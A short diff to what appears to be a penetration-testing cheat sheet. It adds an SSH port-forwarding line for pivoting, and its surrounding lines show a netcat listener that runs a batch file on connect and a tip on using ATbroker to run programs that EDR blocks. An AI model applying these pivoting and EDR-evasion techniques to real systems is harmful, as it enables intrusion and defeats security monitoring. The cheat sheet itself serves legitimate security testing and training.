@@ -64,6 +64,10 @@ nc <ip> <port>
 nc -l -p 4444 -e relay.bat
 
 
+--# SSH #--
+#pivot with SSH using port forward
+ssh -L <listeningport>:<localsystem>:<localport> <user>@<targetip>
+
 =======================================================================
 --# LOL #--
 #using tools such as ATbroker in Win can be a way to execute programs blocked by EDR
